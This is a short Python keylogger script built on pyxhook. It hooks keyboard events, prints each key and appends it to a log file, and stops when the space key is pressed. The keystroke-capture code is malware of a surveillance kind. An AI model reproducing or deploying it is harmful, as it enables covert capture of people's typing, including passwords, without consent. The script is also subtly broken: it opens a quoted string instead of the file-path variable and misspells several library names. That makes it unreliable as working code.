import pyxhook

log_file="/data/key.log"
def kbevent(event):
    print(event.key)
    log=open('log_file',"a")
    log.write(event.key)
    if(event.Askii==32):
        log.close()
        hookman.cancel()

hookman=pyxhook.Hookmanager()
hookman.KeyDown=kbevent
hookman.HookKeyBoard()
hookman.start()

